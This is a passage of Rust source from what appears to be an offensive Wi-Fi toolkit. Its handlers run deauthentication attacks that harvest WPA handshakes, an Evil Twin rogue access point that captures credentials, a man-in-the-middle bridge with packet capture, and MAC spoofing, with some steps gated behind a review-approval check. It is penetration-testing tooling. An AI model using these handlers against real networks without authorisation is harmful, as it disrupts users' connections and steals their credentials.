            "Reboot initiated".to_string(),
            json!({ "action": "reboot" }),
        ));
    }

    #[cfg(not(target_os = "linux"))]
    {
        bail!("Reboot not supported on this platform");
    }
}

pub(crate) fn handle_system_poweroff() -> Result<HandlerResult> {
    #[cfg(target_os = "linux")]
    {
        system_reboot_cmd(LINUX_REBOOT_CMD_POWER_OFF)?;
        return Ok((
            "Poweroff initiated".to_string(),
            json!({ "action": "poweroff" }),
        ));
    }

    #[cfg(not(target_os = "linux"))]
    {
        bail!("Poweroff not supported on this platform");
    }
}

#[cfg(target_os = "linux")]
const LINUX_REBOOT_MAGIC1: libc::c_int = 0xfee1dead_u32 as i32;
#[cfg(target_os = "linux")]
const LINUX_REBOOT_MAGIC2: libc::c_int = 672274793;
#[cfg(target_os = "linux")]
const LINUX_REBOOT_CMD_RESTART: libc::c_int = 0x01234567;
#[cfg(target_os = "linux")]
const LINUX_REBOOT_CMD_POWER_OFF: libc::c_int = 0x4321fedc;

#[cfg(target_os = "linux")]
fn system_reboot_cmd(cmd: libc::c_int) -> Result<()> {
    unsafe { libc::sync() };

    let res = unsafe {
        libc::syscall(
            libc::SYS_reboot as libc::c_long,
            LINUX_REBOOT_MAGIC1,
            LINUX_REBOOT_MAGIC2,
            cmd,
            0,
        )
    };

    if res == 0 {
        return Ok(());
    }

    let err = std::io::Error::last_os_error();
    if err.kind() == std::io::ErrorKind::PermissionDenied {
        bail!("Insufficient privileges to reboot (CAP_SYS_BOOT required)");
    }
    bail!("Reboot syscall failed: {}", err);
}

fn handle_system_purge(root: &Path) -> Result<HandlerResult> {
    let mut errors = Vec::new();
    let warnings = Vec::new();
    let loot_path = root.join("loot").display().to_string();
    let wifi_path = root.join("wifi").display().to_string();
    let scripts_path = root.join("scripts").display().to_string();
    let target_path = root.join("target").display().to_string();
    let root_path = root.display().to_string();
    let purge_paths = vec![
        "/usr/local/bin/rustyjack-ui".to_string(),
        "/etc/systemd/system/rustyjack.service".to_string(),
        "/etc/systemd/system/multi-user.target.wants/rustyjack.service".to_string(),
        "/etc/udev/rules.d/99-rustyjack-wifi.rules".to_string(),
        "/var/log/rustyjack".to_string(),
        "/tmp/rustyjack".to_string(),
        loot_path,
        wifi_path,
        scripts_path,
        target_path,
        root_path,
    ];
    let existing: Vec<String> = purge_paths
        .iter()
        .filter_map(|p| {
            let path = Path::new(p);
            if path.exists() {
                Some(p.to_string())
            } else {
                None
            }
        })
        .collect();
    if existing.is_empty() {
        errors.push("No purge targets found".to_string());
    }
    let checks = json!({
        "paths": purge_paths,
        "existing": existing,
    });
    preflight_only_response(
        root,
        crate::audit::operations::SYSTEM_PURGE,
        checks,
        errors,
        warnings,
    )
}

fn handle_system_usb_mount(root: &Path, args: UsbMountArgs) -> Result<HandlerResult> {
    let mode = match args.mode {
        UsbMountMode::ReadOnly => MountMode::ReadOnly,
        UsbMountMode::ReadWrite => MountMode::ReadWrite,
    };
    let mut policy = MountPolicy::for_root(root);
    policy.default_mode = mode;
    policy.allow_rw = matches!(args.mode, UsbMountMode::ReadWrite);

    let request = MountRequest {
        device: PathBuf::from(&args.device),
        mode,
        preferred_name: args.preferred_name,
    };

    let response = crate::mount::mount_device(&policy, request)?;
    let data = json!({
        "device": response.device,
        "mountpoint": response.mountpoint,
        "fs_type": format!("{:?}", response.fs_type),
        "readonly": response.readonly,
    });
    Ok(("USB mounted".to_string(), data))
}

fn handle_system_usb_unmount(root: &Path, args: UsbUnmountArgs) -> Result<HandlerResult> {
    let policy = MountPolicy::for_root(root);
    let request = UnmountRequest {
        mountpoint: PathBuf::from(&args.mountpoint),
        detach: args.detach,
    };
    crate::mount::unmount(&policy, request)?;
    let data = json!({ "mountpoint": args.mountpoint });
    Ok(("USB unmounted".to_string(), data))
}

#[tracing::instrument(target = "usb", skip(root, args), fields(device = %args.device))]
fn handle_system_export_logs_to_usb(
    root: &Path,
    args: ExportLogsToUsbArgs,
) -> Result<HandlerResult> {
    let mut policy = MountPolicy::for_root(root);
    policy.default_mode = MountMode::ReadWrite;
    policy.allow_rw = true;

    let request = MountRequest {
        device: PathBuf::from(&args.device),
        mode: MountMode::ReadWrite,
        preferred_name: None,
    };

    let response = crate::mount::mount_device(&policy, request)?;
    let mountpoint = response.mountpoint;
    let filename = format!(
        "rustyjack_logs_{}.txt",
        Local::now().format("%Y%m%d_%H%M%S")
    );
    let dest = mountpoint.join(&filename);

    let write_result = (|| -> Result<()> {
        let bundle = crate::services::logs::collect_log_bundle(root)
            .map_err(|e| anyhow!("log bundle collection failed: {}", e))?;
        let mut file =
            File::create(&dest).with_context(|| format!("creating {}", dest.display()))?;
        file.write_all(bundle.as_bytes())
            .with_context(|| format!("writing {}", dest.display()))?;
        file.sync_all().context("syncing log file")?;

        #[cfg(target_os = "linux")]
        {
            use std::os::unix::io::AsRawFd;

            let dir = File::open(&mountpoint)
                .with_context(|| format!("opening {}", mountpoint.display()))?;
            let rc = unsafe { libc::syncfs(dir.as_raw_fd()) };
            if rc != 0 {
                return Err(anyhow!(
                    "syncfs failed: {}",
                    std::io::Error::last_os_error()
                ));
            }
        }

        Ok(())
    })();

    let unmount_result = crate::mount::unmount(
        &policy,
        UnmountRequest {
            mountpoint: mountpoint.clone(),
            detach: false,
        },
    );

    match (write_result, unmount_result) {
        (Ok(()), Ok(())) => {
            let data = json!({ "filename": filename });
            Ok(("Logs exported to USB".to_string(), data))
        }
        (Err(err), Ok(())) => Err(err),
        (Ok(()), Err(err)) => Err(err),
        (Err(err), Err(unmount_err)) => {
            Err(anyhow!("{}; also failed to unmount: {}", err, unmount_err))
        }
    }
}

fn handle_bridge_start(root: &Path, args: BridgeStartArgs) -> Result<HandlerResult> {
    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let warnings = Vec::new();
        let iface_a = Path::new("/sys/class/net").join(&args.interface_a);
        let iface_b = Path::new("/sys/class/net").join(&args.interface_b);
        if !iface_a.exists() {
            errors.push(format!("Interface {} not found", args.interface_a));
        }
        if !iface_b.exists() {
            errors.push(format!("Interface {} not found", args.interface_b));
        }
        if args.interface_a == args.interface_b {
            errors.push("Interface A and B must be different".to_string());
        }
        let checks = json!({
            "interface_a": args.interface_a,
            "interface_b": args.interface_b,
        });
        return preflight_only_response(
            root,
            crate::audit::operations::BRIDGE_START,
            checks,
            errors,
            warnings,
        );
    }
    let backup = backup_routing_state(root)?;
    start_bridge_pair(&args.interface_a, &args.interface_b)?;
    let label = format!("bridge_{}_{}", args.interface_a, args.interface_b);
    let pcap_path = build_mitm_pcap_path(root, Some(&label))?;
    let _ = append_payload_log(
        root,
        &format!(
            "[{}] bridge start: {} <-> {} (pcap {})",
            chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
            args.interface_a,
            args.interface_b,
            pcap_path.to_string_lossy()
        ),
    );
    start_pcap_capture("br0", &pcap_path)?;
    let data = json!({
        "bridge": "br0",
        "interfaces": [args.interface_a, args.interface_b],
        "capture_path": pcap_path,
        "routing_backup": backup,
    });
    Ok(("Transparent bridge enabled".to_string(), data))
}

fn handle_bridge_stop(root: &Path, args: BridgeStopArgs) -> Result<HandlerResult> {
    let _ = stop_pcap_capture();
    stop_bridge_pair(&args.interface_a, &args.interface_b)?;
    if let Err(err) = restore_routing_state(root) {
        tracing::warn!("bridge stop: failed to restore routing: {err}");
    }
    let _ = append_payload_log(
        root,
        &format!(
            "[{}] bridge stop: {} <-> {}",
            chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
            args.interface_a,
            args.interface_b,
        ),
    );
    let data = json!({
        "bridge": "br0",
        "interfaces": [args.interface_a, args.interface_b],
        "routing_restored": true,
    });
    Ok(("Transparent bridge disabled".to_string(), data))
}

fn handle_wifi_scan(
    root: &Path,
    args: WifiScanArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    tracing::info!("Starting WiFi scan");

    let interface = match args.interface {
        Some(iface) => iface,
        None => {
            // Try to get active interface from config first
            if let Ok(Some(active)) = get_active_interface(root) {
                tracing::info!("Using active interface from config: {}", active);
                active
            } else {
                // Fall back to auto-detection
                select_wifi_interface(None)?
            }
        }
    };
    let interface = select_wifi_interface(Some(interface.trim().to_string()))?;

    enforce_single_interface(&interface)?;
    try_apply_mac_policy(root, MacStage::PreAssoc, &interface, None);

    check_cancel(cancel)?;
    let networks =
        match scan_wifi_networks_with_timeout_cancel(&interface, Duration::from_secs(5), cancel) {
            Ok(nets) => {
                tracing::info!("Scan completed, found {} network(s)", nets.len());
                nets
            }
            Err(e) => {
                if is_cancelled_error(&e) {
                    return Err(e);
                }
                tracing::error!("WiFi scan failed on {interface}: {e}");
                bail!("WiFi scan failed: {e}");
            }
        };
    check_cancel(cancel)?;

    let data = json!({
        "interface": interface,
        "networks": networks,
        "count": networks.len(),
        "isolation_enforced": true,
    });
    Ok(("Wi-Fi scan completed".to_string(), data))
}

fn try_apply_mac_policy(root: &Path, stage: MacStage, interface: &str, ssid: Option<&str>) {
    let config = load_mac_policy_config(root);
    if config.assoc_mode == MacMode::Off && config.preassoc_mode == MacMode::Off {
        return;
    }

    if stage == MacStage::Assoc {
        if let Some(ssid) = ssid {
            if let Some(mac) = per_network_mac_override(root, interface, ssid) {
                if let Ok(parsed) = MacAddress::parse(&mac) {
                    if let Ok(mut manager) = MacManager::new() {
                        manager.set_auto_restore(false);
                        if let Ok(current) = manager.get_mac(interface) {
                            if current != parsed {
                                if manager.set_mac(interface, &parsed).is_ok() {
                                    tracing::info!(
                                        "[MAC_POLICY] override {} {} -> {} (per-network)",
                                        interface,
                                        current,
                                        parsed
                                    );
                                }
                            }
                        }
                    }
                    return;
                }
            }
        }
    }

    match MacPolicyEngine::new(root, config) {
        Ok(mut engine) => {
            if let Err(e) = engine.apply(stage, interface, ssid) {
                tracing::warn!(
                    "[MAC_POLICY] apply failed on {} (stage={:?}): {}",
                    interface,
                    stage,
                    e
                );
            }
        }
        Err(e) => {
            tracing::warn!("[MAC_POLICY] initialization failed: {}", e);
        }
    }
}

fn load_mac_policy_config(root: &Path) -> MacPolicyConfig {
    let policy_path = root.join("wifi").join("mac_policy.json");
    if policy_path.exists() {
        match MacPolicyConfig::load(&policy_path) {
            Ok(cfg) => return cfg,
            Err(e) => tracing::warn!(
                "[MAC_POLICY] Failed to load {}: {}. Falling back to gui_conf.json",
                policy_path.display(),
                e
            ),
        }
    }

    let gui_path = root.join("gui_conf.json");
    let mut cfg = MacPolicyConfig::default();

    let raw = match fs::read_to_string(&gui_path) {
        Ok(data) => data,
        Err(_) => return cfg,
    };
    let json: Value = match serde_json::from_str(&raw) {
        Ok(val) => val,
        Err(_) => return cfg,
    };
    let settings = match json.get("settings") {
        Some(val) => val,
        None => return cfg,
    };

    let mac_random = settings
        .get("mac_randomization_enabled")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let per_network = settings
        .get("per_network_mac_enabled")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    if per_network {
        cfg.assoc_mode = MacMode::Stable;
        cfg.preassoc_mode = MacMode::Random;
        cfg.stable_scope = StableScope::Ssid;
        cfg.vendor_policy = VendorPolicy::PreserveCurrent;
    } else if mac_random {
        cfg.assoc_mode = MacMode::Random;
        cfg.preassoc_mode = MacMode::Random;
        cfg.vendor_policy = VendorPolicy::PreserveCurrent;
    }

    if let Some(exceptions) = settings
        .get("mac_randomization_exceptions")
        .and_then(|v| v.as_array())
    {
        cfg.exceptions = exceptions
            .iter()
            .filter_map(|v| v.as_str().map(|s| s.to_string()))
            .collect();
    }

    if let Some(lifetime) = settings
        .get("mac_randomization_lifetime_secs")
        .and_then(|v| v.as_u64())
    {
        cfg.lifetime_secs = Some(lifetime);
    }

    cfg
}

fn per_network_mac_override(root: &Path, interface: &str, ssid: &str) -> Option<String> {
    if interface.trim().is_empty() || ssid.trim().is_empty() {
        return None;
    }
    let gui_path = root.join("gui_conf.json");
    let raw = fs::read_to_string(&gui_path).ok()?;
    let json: Value = serde_json::from_str(&raw).ok()?;
    let settings = json.get("settings")?;
    let per_network = settings.get("per_network_macs")?.as_object()?;
    let iface_map = per_network.get(interface)?.as_object()?;
    iface_map
        .get(ssid)
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
}

fn handle_wifi_mac_randomize(args: WifiMacRandomizeArgs) -> Result<HandlerResult> {
    #[cfg(not(target_os = "linux"))]
    {
        let _ = args;
        bail!("MAC randomization supported on Linux targets only");
    }

    #[cfg(target_os = "linux")]
    {
        let interface = args.interface;
        let mut hotspot_stopped = false;
        if let Some(state) = status_hotspot() {
            if state.ap_interface == interface {
                stop_hotspot().context("stopping hotspot before MAC change")?;
                hotspot_stopped = true;
            }
        }

        let mut wifi_disconnected = false;
        let mut disconnect_error = None;
        if read_wifi_link_info(&interface).connected {
            match disconnect_wifi_interface(Some(interface.clone())) {
                Ok(_) => wifi_disconnected = true,
                Err(e) => disconnect_error = Some(e.to_string()),
            }
        }

        let (new_mac, vendor_reused) = generate_vendor_aware_mac(&interface)?;
        let mut manager = MacManager::new().context("creating MacManager")?;
        manager.set_auto_restore(false);
        let mut state = None;
        let mut retry_used = false;
        for attempt in 0..2 {
            match manager.set_mac(&interface, &new_mac) {
                Ok(val) => {
                    state = Some(val);
                    break;
                }
                Err(err) => {
                    let err_str = err.to_string();
                    if attempt == 0 && mac_error_looks_busy(&err_str) {
                        retry_used = true;
                        std::thread::sleep(Duration::from_millis(300));
                        continue;
                    }
                    return Err(err).context("setting randomized MAC");
                }
            }
        }
        let state = state.ok_or_else(|| anyhow!("MAC randomization failed"))?;
        let reconnect_ok = renew_dhcp_and_reconnect(&interface);
        let data = json!({
            "interface": interface,
            "original_mac": state.original_mac.to_string(),
            "new_mac": state.current_mac.to_string(),
            "vendor_reused": vendor_reused,
            "reconnect_ok": reconnect_ok,
            "hotspot_stopped": hotspot_stopped,
            "wifi_disconnected": wifi_disconnected,
            "disconnect_error": disconnect_error,
            "retry_used": retry_used,
        });
        Ok(("MAC randomized".to_string(), data))
    }
}

fn mac_error_looks_busy(err: &str) -> bool {
    let lower = err.to_lowercase();
    lower.contains("busy") || lower.contains("resource busy") || lower.contains("ebusy")
}

fn handle_wifi_mac_set_vendor(args: WifiMacSetVendorArgs) -> Result<HandlerResult> {
    #[cfg(not(target_os = "linux"))]
    {
        let _ = args;
        bail!("MAC vendor setting supported on Linux targets only");
    }

    #[cfg(target_os = "linux")]
    {
        if args.vendor.trim().is_empty() {
            bail!("Vendor name is required");
        }
        let interface = args.interface;
        let mut manager = MacManager::new().context("creating MacManager")?;
        manager.set_auto_restore(false);
        let state = manager
            .set_with_strategy(&interface, MacGenerationStrategy::Vendor(&args.vendor))
            .context("setting vendor MAC")?;
        let reconnect_ok = renew_dhcp_and_reconnect(&interface);
        let data = json!({
            "interface": interface,
            "vendor": args.vendor,
            "original_mac": state.original_mac.to_string(),
            "new_mac": state.current_mac.to_string(),
            "reconnect_ok": reconnect_ok,
        });
        Ok(("Vendor MAC set".to_string(), data))
    }
}

fn handle_wifi_mac_set(args: WifiMacSetArgs) -> Result<HandlerResult> {
    #[cfg(not(target_os = "linux"))]
    {
        let _ = args;
        bail!("MAC setting supported on Linux targets only");
    }

    #[cfg(target_os = "linux")]
    {
        if args.mac.trim().is_empty() {
            bail!("MAC address is required");
        }
        let interface = args.interface;
        let mut manager = MacManager::new().context("creating MacManager")?;
        manager.set_auto_restore(false);
        let target = MacAddress::parse(&args.mac)?;
        let state = manager
            .set_mac(&interface, &target)
            .context("setting MAC")?;
        let reconnect_ok = renew_dhcp_and_reconnect(&interface);
        let data = json!({
            "interface": interface,
            "original_mac": state.original_mac.to_string(),
            "new_mac": state.current_mac.to_string(),
            "reconnect_ok": reconnect_ok,
        });
        Ok(("MAC set".to_string(), data))
    }
}

fn handle_wifi_mac_restore(args: WifiMacRestoreArgs) -> Result<HandlerResult> {
    #[cfg(not(target_os = "linux"))]
    {
        let _ = args;
        bail!("MAC restore supported on Linux targets only");
    }

    #[cfg(target_os = "linux")]
    {
        if args.original_mac.trim().is_empty() {
            bail!("Original MAC is required");
        }
        let interface = args.interface;
        let mut manager = MacManager::new().context("creating MacManager")?;
        manager.set_auto_restore(false);
        let target = MacAddress::parse(&args.original_mac)?;
        let state = manager
            .set_mac(&interface, &target)
            .context("restoring MAC")?;
        let reconnect_ok = renew_dhcp_and_reconnect(&interface);
        let data = json!({
            "interface": interface,
            "original_mac": state.original_mac.to_string(),
            "restored_mac": state.current_mac.to_string(),
            "reconnect_ok": reconnect_ok,
        });
        Ok(("MAC restored".to_string(), data))
    }
}

fn handle_wifi_tx_power(args: WifiTxPowerArgs) -> Result<HandlerResult> {
    #[cfg(not(target_os = "linux"))]
    {
        let _ = args;
        bail!("TX power control supported on Linux targets only");
    }

    #[cfg(target_os = "linux")]
    {
        let interface = args.interface;
        let mut mgr =
            WirelessManager::new().map_err(|e| anyhow!("Failed to open nl80211 socket: {}", e))?;
        mgr.set_tx_power(&interface, TxPowerSetting::Fixed(args.dbm * 100))
            .with_context(|| format!("setting tx power on {}", interface))?;
        let data = json!({
            "interface": interface,
            "dbm": args.dbm,
        });
        Ok(("TX power updated".to_string(), data))
    }
}

#[cfg(target_os = "linux")]
fn generate_vendor_aware_mac(interface: &str) -> Result<(MacAddress, bool)> {
    let current = fs::read_to_string(format!("/sys/class/net/{}/address", interface))
        .ok()
        .and_then(|s| MacAddress::parse(s.trim()).ok());

    if let Some(mac) = current {
        if let Some(vendor) = VendorOui::from_oui(mac.oui()) {
            let mut candidate = MacAddress::random_with_oui(vendor.oui)?;
            let mut bytes = *candidate.as_bytes();
            bytes[0] = (bytes[0] | 0x02) & 0xFE;
            candidate = MacAddress::new(bytes);
            return Ok((candidate, true));
        }
    }

    Ok((MacAddress::random()?, false))
}

#[cfg(not(target_os = "linux"))]
fn generate_vendor_aware_mac(_interface: &str) -> Result<(MacAddress, bool)> {
    Ok((MacAddress::random()?, false))
}

#[cfg(target_os = "linux")]
fn renew_dhcp_and_reconnect(interface: &str) -> bool {
    let dhcp_success = match crate::runtime::shared_runtime() {
        Ok(rt) => rt.block_on(async {
            if let Err(e) = rustyjack_netlink::dhcp_renew(interface, None).await {
                tracing::warn!("DHCP renew failed for {}: {}", interface, e);
                false
            } else {
                tracing::info!("DHCP lease renewed for {}", interface);
                true
            }
        }),
        Err(e) => {
            tracing::warn!("DHCP runtime unavailable: {}", e);
            false
        }
    };

    dhcp_success
}

#[cfg(not(target_os = "linux"))]
fn renew_dhcp_and_reconnect(_interface: &str) -> bool {
    false
}

fn handle_wifi_deauth(
    root: &Path,
    args: WifiDeauthArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    use crate::wireless_native::{self, DeauthConfig};

    let ssid_display = args.ssid.clone().unwrap_or_else(|| args.bssid.clone());
    tracing::info!(
        "Starting native Rust deauth attack on BSSID: {} (SSID: {})",
        args.bssid,
        ssid_display
    );

    // Validate BSSID format (XX:XX:XX:XX:XX:XX)
    let mac_regex = Regex::new(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$").unwrap();
    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let mut warnings = Vec::new();

        if !mac_regex.is_match(&args.bssid) {
            errors.push("Invalid BSSID format (expected AA:BB:CC:DD:EE:FF)".to_string());
        }
        if let Some(ref client) = args.client {
            if !mac_regex.is_match(client) {
                errors.push("Invalid client MAC format".to_string());
            }
        }
        if args.channel == 0 || (args.channel > 14 && args.channel < 36) || args.channel > 165 {
            errors.push(format!(
                "Invalid channel {} (use 1-14 for 2.4GHz or 36-165 for 5GHz)",
                args.channel
            ));
        }

        let caps = wireless_native::check_capabilities(&args.interface);
        if !caps.interface_exists {
            errors.push(format!("Interface {} does not exist", args.interface));
        }
        if !caps.interface_is_wireless {
            errors.push(format!("Interface {} is not wireless", args.interface));
        }
        if !caps.supports_monitor_mode {
            warnings.push("Monitor mode not supported".to_string());
        }

        let checks = json!({
            "interface": args.interface,
            "bssid": args.bssid,
            "ssid": args.ssid,
            "channel": args.channel,
            "capabilities": {
                "native_available": caps.native_available,
                "has_root": caps.has_root,
                "interface_exists": caps.interface_exists,
                "interface_is_wireless": caps.interface_is_wireless,
                "supports_monitor_mode": caps.supports_monitor_mode,
                "supports_injection": caps.supports_injection,
            }
        });

        return preflight_only_response(
            root,
            crate::audit::operations::WIFI_DEAUTH,
            checks,
            errors,
            warnings,
        );
    }

    if !mac_regex.is_match(&args.bssid) {
        bail!("Invalid BSSID format. Expected MAC address like AA:BB:CC:DD:EE:FF");
    }

    // Validate client MAC if provided
    if let Some(ref client) = args.client {
        if !mac_regex.is_match(client) {
            bail!("Invalid client MAC format. Expected like AA:BB:CC:DD:EE:FF");
        }
    }

    // Validate channel (1-14 for 2.4GHz, 36-165 for 5GHz)
    if args.channel == 0 || (args.channel > 14 && args.channel < 36) || args.channel > 165 {
        bail!(
            "Invalid channel {}. Use 1-14 for 2.4GHz or 36-165 for 5GHz",
            args.channel
        );
    }

    // Check if we have root privileges (required for raw sockets)
    if !wireless_native::native_available() {
        bail!("Deauth attacks require root privileges. Run with sudo.");
    }

    // Check if interface is wireless
    if !wireless_native::is_wireless_interface(&args.interface) {
        bail!("Interface {} is not a wireless interface", args.interface);
    }

    enforce_single_interface(&args.interface)?;
    check_cancel(cancel)?;

    // Check wireless capabilities
    let caps = wireless_native::check_capabilities(&args.interface);
    if !caps.is_attack_capable() {
        let mut reasons = Vec::new();
        if !caps.has_root {
            reasons.push("not running as root");
        }
        if !caps.interface_is_wireless {
            reasons.push("interface is not wireless");
        }
        if !caps.supports_monitor_mode {
            reasons.push("monitor mode not supported");
        }
        bail!(
            "Interface {} is not capable of attacks: {}",
            args.interface,
            reasons.join(", ")
        );
    }

    // Create loot directory under network-specific folder + attack type
    let loot_dir =
        wireless_target_directory(root, args.ssid.clone(), Some(args.bssid.clone())).join("Deauth");
    fs::create_dir_all(&loot_dir)
        .with_context(|| format!("creating loot directory: {}", loot_dir.display()))?;

    let tag = wireless_tag(
        args.ssid.as_deref(),
        Some(args.bssid.as_str()),
        &args.interface,
    );
    let _ = log_mac_usage(root, &args.interface, "wifi_deauth", Some(&tag));

    // Build deauth config for native implementation
    let config = DeauthConfig {
        bssid: args.bssid.clone(),
        ssid: args.ssid.clone(),
        channel: args.channel,
        interface: args.interface.clone(),
        client: args.client.clone(),
        packets: args.packets,
        duration: args.duration,
        interval: args.interval,
        continuous: args.continuous,
    };

    tracing::info!("Executing native Rust deauth attack (rustyjack-wireless)");

    // Execute the native deauth attack
    let result = wireless_native::execute_deauth_attack_cancellable(
        &loot_dir,
        &config,
        cancel,
        |progress, status| {
            tracing::debug!("Deauth progress: {:.0}% - {}", progress * 100.0, status);
        },
    )?;

    let target_label = args.ssid.clone().unwrap_or_else(|| args.bssid.clone());
    let log_file = if result.log_file.as_os_str().is_empty() {
        let summary = vec![
            format!("Deauth attack on {}", ssid_display),
            format!("Interface: {}", args.interface),
            format!("Channel: {}", args.channel),
            format!("Packets per burst: {}", args.packets),
            format!("Bursts: {}", result.bursts),
            format!("Packets sent: {}", result.packets_sent),
            format!("Duration (s): {}", result.duration_secs),
            format!("Handshake captured: {}", result.handshake_captured),
        ];
        write_scoped_log(
            root,
            "Wireless",
            &target_label,
            "Deauth",
            "deauth",
            &summary,
        )
        .map(|p| p.display().to_string())
    } else {
        move_log_into_scope(
            root,
            "Wireless",
            &target_label,
            "Deauth",
            &result.log_file,
            "deauth",
        )
        .map(|p| p.display().to_string())
    };

    // Build response data
    let data = json!({
        "bssid": result.bssid,
        "ssid": result.ssid,
        "channel": result.channel,
        "interface": args.interface,
        "duration": result.duration_secs,
        "packets_per_burst": args.packets,
        "total_packets_sent": result.packets_sent,
        "deauth_bursts": result.bursts,
        "continuous_mode": args.continuous,
        "target_client": args.client,
        "log_file": log_file,
        "capture_files": result.capture_files.iter().map(|p| p.display().to_string()).collect::<Vec<_>>(),
        "handshake_captured": result.handshake_captured,
        "handshake_file": result.handshake_file.as_ref().map(|p| p.display().to_string()),
        "eapol_frames": result.eapol_frames,
        "loot_directory": loot_dir.display().to_string(),
        "implementation": "native-rust",
        "isolation_enforced": true,
    });

    let message = if result.handshake_captured {
        format!(
            "SUCCESS: Handshake captured! ({} packets in {} bursts, {} EAPOL frames)",
            result.packets_sent, result.bursts, result.eapol_frames
        )
    } else {
        format!(
            "Deauth completed - {} packets sent in {} bursts, no handshake captured",
            result.packets_sent, result.bursts
        )
    };

    Ok((message, data))
}

fn handle_wifi_evil_twin(
    root: &Path,
    args: WifiEvilTwinArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    use crate::wireless_native;
    use rustyjack_wireless::evil_twin::{execute_evil_twin_cancellable, EvilTwin, EvilTwinConfig};
    use std::time::Duration;

    tracing::info!("Starting Evil Twin attack on SSID: {}", args.ssid);

    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let mut warnings = Vec::new();
        let caps = wireless_native::check_capabilities(&args.interface);
        if !caps.interface_exists {
            errors.push(format!("Interface {} does not exist", args.interface));
        }
        if !caps.interface_is_wireless {
            errors.push(format!("Interface {} is not wireless", args.interface));
        }

        let mut supports_ap = false;
        if let Ok(mut mgr) = WirelessManager::new() {
            if let Ok(phy_caps) = mgr.get_phy_capabilities(&args.interface) {
                supports_ap = phy_caps.supports_ap;
            }
        }
        if !supports_ap {
            warnings.push("AP mode not supported on this interface".to_string());
        }

        let checks = json!({
            "interface": args.interface,
            "ssid": args.ssid,
            "channel": args.channel,
            "capabilities": {
                "native_available": caps.native_available,
                "has_root": caps.has_root,
                "interface_exists": caps.interface_exists,
                "interface_is_wireless": caps.interface_is_wireless,
                "supports_monitor_mode": caps.supports_monitor_mode,
                "supports_injection": caps.supports_injection,
                "supports_ap": supports_ap,
            }
        });

        return preflight_only_response(
            root,
            crate::audit::operations::WIFI_EVIL_TWIN,
            checks,
            errors,
            warnings,
        );
    }

    // Check if we have root privileges
    if !wireless_native::native_available() {
        bail!("Evil Twin attacks require root privileges. Run with sudo.");
    }

    // Check if interface is wireless
    if !wireless_native::is_wireless_interface(&args.interface) {
        bail!("Interface {} is not a wireless interface", args.interface);
    }

    enforce_single_interface(&args.interface)?;
    check_cancel(cancel)?;

    // Check required tools are installed
    let missing = EvilTwin::check_requirements()
        .map_err(|e| anyhow::anyhow!("Failed to check requirements: {}", e))?;
    if !missing.is_empty() {
        bail!(
            "Missing required capabilities for Evil Twin: {}",
            missing.join(", ")
        );
    }

    let tag = wireless_tag(
        Some(args.ssid.as_str()),
        args.target_bssid.as_deref(),
        &args.interface,
    );
    let _ = log_mac_usage(root, &args.interface, "wifi_evil_twin", Some(&tag));

    // Create loot directory for captured credentials under target + attack type
    let loot_dir =
        wireless_target_directory(root, Some(args.ssid.clone()), args.target_bssid.clone())
            .join("EvilTwin");
    fs::create_dir_all(&loot_dir)
        .with_context(|| format!("creating loot directory: {}", loot_dir.display()))?;

    // Parse target BSSID if provided
    let target_bssid = if let Some(ref bssid_str) = args.target_bssid {
        Some(
            bssid_str
                .parse()
                .map_err(|e| anyhow::anyhow!("Invalid BSSID: {}", e))?,
        )
    } else {
        None
    };

    // Configure the Evil Twin attack
    let config = EvilTwinConfig {
        ssid: args.ssid.clone(),
        channel: args.channel,
        ap_interface: args.interface.clone(),
        deauth_interface: None, // Could add second interface support later
        target_bssid,
        simultaneous_deauth: false, // Requires second interface
        deauth_interval: Duration::from_secs(5),
        duration: Duration::from_secs(args.duration.into()),
        open_network: args.open,
        wpa_password: None,
        capture_path: loot_dir.to_string_lossy().to_string(),
    };

    // Execute the attack with progress callback
    let result = match execute_evil_twin_cancellable(
        config,
        Some(&loot_dir.to_string_lossy()),
        cancel,
        |msg| {
            tracing::info!("Evil Twin: {}", msg);
        },
    ) {
        Ok(result) => result,
        Err(err) => {
            let err_anyhow: anyhow::Error = err.into();
            if is_cancelled_error(&err_anyhow) {
                return Err(err_anyhow);
            }
            return Err(anyhow::anyhow!("Evil Twin attack failed: {}", err_anyhow));
        }
    };

    let target_label = args.ssid.clone();
    let log_file = if result.log_path.as_os_str().is_empty() {
        let summary = vec![
            format!("Evil Twin on {}", target_label),
            format!("Interface: {}", args.interface),
            format!("Channel: {}", args.channel),
            format!("Duration (s): {}", args.duration),
            format!("Clients: {}", result.stats.clients_connected),
            format!("Handshakes: {}", result.stats.handshakes_captured),
            format!("Credentials: {}", result.stats.credentials_captured),
            format!("Deauth packets: {}", result.stats.deauth_packets),
        ];
        write_scoped_log(
            root,
            "Wireless",
            target_label.as_str(),
            "EvilTwin",
            "eviltwin",
            &summary,
        )
        .map(|p| p.display().to_string())
    } else {
        move_log_into_scope(
            root,
            "Wireless",
            target_label.as_str(),
            "EvilTwin",
            &result.log_path,
            "eviltwin",
        )
        .map(|p| p.display().to_string())
    };

    let data = json!({
        "ssid": args.ssid,
        "interface": args.interface,
        "channel": args.channel,
        "target_bssid": args.target_bssid,
        "duration": args.duration,
        "open_network": args.open,
        "status": if result.stats.ap_started { "completed" } else { "failed" },
        "clients_connected": result.stats.clients_connected,
        "handshakes_captured": result.stats.handshakes_captured,
        "credentials_captured": result.stats.credentials_captured,
        "deauth_packets": result.stats.deauth_packets,
        "attack_duration_secs": result.stats.duration.as_secs(),
        "loot_directory": result.loot_path.display().to_string(),
        "log_file": log_file,
        "isolation_enforced": true,
    });

    let message = if result.stats.ap_started {
        format!(
            "Evil Twin complete: {} clients, {} handshakes captured",
            result.stats.clients_connected, result.stats.handshakes_captured
        )
    } else {
        "Evil Twin attack failed to start AP".to_string()
    };

    Ok((message, data))
}

fn handle_wifi_pmkid(
    root: &Path,
    args: WifiPmkidArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
